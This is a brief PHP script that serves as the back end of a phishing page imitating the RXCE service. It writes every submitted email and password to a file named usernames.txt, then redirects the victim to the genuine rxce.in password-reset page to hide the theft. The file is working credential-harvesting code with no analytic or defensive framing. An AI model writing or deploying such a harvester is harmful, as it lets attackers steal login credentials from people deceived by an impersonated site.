<?php

file_put_contents("usernames.txt", "RXCE Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://rxce.in/#/resetPassword/');
exit();
?>
